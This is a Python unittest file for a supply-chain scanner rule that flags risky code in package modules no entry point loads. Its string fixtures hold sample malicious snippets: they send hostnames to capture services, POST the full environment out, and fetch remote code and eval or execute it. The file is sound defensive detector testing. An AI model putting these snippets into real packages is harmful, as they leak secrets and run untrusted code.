"""SC-USE-RISK (0.1.8): the strong import-time shapes in files a package runs
only when it is used — a module no entry point loads, a script a CLI spawns
— and not in tests, examples, docs or a web app's static assets.

Payload text is inert: hosts are capture services or .invalid, nothing runs.
"""
import unittest

from tests.registry._review_support import scan_npm, scan_wheel

BEACON_JS = ("const os = require('os');\nconst https = require('https');\n"
             "module.exports = function report() {\n"
             "  https.get('https://webhook.site/0?h=' + os.hostname());\n};\n")
FETCH_RUN_JS = ("const axios = require('axios');\n(async function () {\n"
                "  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n")
HARVEST_JS = ("module.exports = async () => {\n"
              "  await fetch('https://api.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n};\n")
DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
                   "const {execFileSync} = require('child_process');\n"
                   "module.exports = () => https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream("
                   "'/tmp/tool'))\n  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")
BEACON_PY = ("import socket, requests\n\ndef report():\n"
             "    requests.post('https://x.oastify.com/', data=socket.gethostname())\n")
MANIFEST = '{"name": "x", "version": "1.0.0", "main": "index.js"}'


def use_risk(res):
    return sorted((i["file"], i["sev"]) for i in res["issues"] if i["rule"] == "SC-USE-RISK")


class UseRiskTests(unittest.TestCase):
    def test_a_module_no_entry_point_loads(self):
        for name, text in (("lib/report.js", BEACON_JS), ("lib/caller.js", FETCH_RUN_JS)):
            with self.subTest(file=name):
                res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", name: text})
                self.assertEqual(use_risk(res), [(name, "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                msg = next(i["msg"] for i in res["issues"] if i["rule"] == "SC-USE-RISK")
                self.assertTrue(msg.startswith(name + " ") and msg.endswith(
                    "Nothing loads it at install or import: it runs when the package's code calls it."), msg)

    def test_code_the_entry_point_loads_is_the_import_time_test(self):
        res = scan_npm({"package.json": MANIFEST, "index.js": "require('./lib/report');\n", "lib/report.js": BEACON_JS})
        self.assertEqual(use_risk(res), [])
        self.assertIn(("lib/report.js", "CRITICAL"),
                      [(i["file"], i["sev"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"])

    def test_only_the_strong_shapes(self):
        # a file downloaded and then run (a binary's installer) is MAJOR at import time: not one
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/fetch.js": DOWNLOAD_RUN_JS})
        self.assertEqual(use_risk(res), [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])
        # rule set 2.17: the whole environment sent anywhere is one
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/env.js": HARVEST_JS})
        self.assertEqual(use_risk(res), [("lib/env.js", "CRITICAL")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_files_that_never_run_when_the_package_is_used(self):
        for folder in ("test", "__tests__", "examples", "docs", "demo", "benchmarks", "out/_next/static/chunks",
                       "static", "public"):
            with self.subTest(folder=folder):
                res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n",
                                f"{folder}/report.js": BEACON_JS})
                self.assertEqual(use_risk(res), [])

    def test_not_read_once_suspicious_nor_past_the_size_limit(self):
        from lazaret.registry import repo
        # SUSPICIOUS at import already (0.1.8: `_0x` names alone are MAJOR, so code that runs what it
        # fetches makes it so)
        res = scan_npm({"package.json": MANIFEST, "index.js": FETCH_RUN_JS, "lib/report.js": BEACON_JS})
        self.assertEqual((res["verdict"], use_risk(res)), ("SUSPICIOUS", []))
        padded = BEACON_JS + "// " + "x" * repo.USE_RISK_MAX_CHARS + "\n"
        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/report.js": padded})
        self.assertEqual(use_risk(res), [])

    def test_out_of_its_time_it_stops_without_making_the_scan_incomplete(self):
        from unittest import mock
        from lazaret.registry import repo
        with mock.patch.object(repo, "USE_RISK_SECONDS", -1.0):
            res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/report.js": BEACON_JS})
        self.assertEqual((res["verdict"], use_risk(res)), ("OK", []))

    def test_a_python_module_nothing_imports(self):
        res = scan_wheel({"x/__init__.py": "VERSION = '1.0'\n", "x/tools/report.py": BEACON_PY,
                          "x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"})
        self.assertEqual(use_risk(res), [("x/tools/report.py", "CRITICAL")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])


if __name__ == "__main__":
    unittest.main()
